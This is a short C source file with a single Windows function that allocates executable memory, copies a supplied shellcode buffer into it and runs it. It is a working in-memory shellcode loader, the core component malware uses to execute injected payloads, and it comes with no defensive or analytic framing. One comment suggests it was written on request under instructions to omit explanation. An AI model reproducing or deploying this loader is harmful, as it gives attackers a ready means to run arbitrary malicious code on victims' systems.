#include <windows.h>
#include <string.h>

void Run_From_Memory(void *shellcode, int size) {
    LPVOID mem = NULL;

    // Allocate executable memory
    mem = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    if (mem == NULL) {
        // Error handling could go here, but per instructions, no explanations or additional text.
        return; 
    }

    // Copy shellcode to the allocated memory
    memcpy(mem, shellcode, size);

    // Cast the memory address to a function pointer and execute
    void (*func)() = (void (*)())mem;
    func();

    // Note: VirtualFree is often not called after shellcode execution
    // because shellcode typically does not return to the caller (e.g.,
    // it might exit the process or jump to another location).
    // If the shellcode is guaranteed to return, VirtualFree(mem, 0, MEM_RELEASE);
    // would be appropriate here for cleanup.
}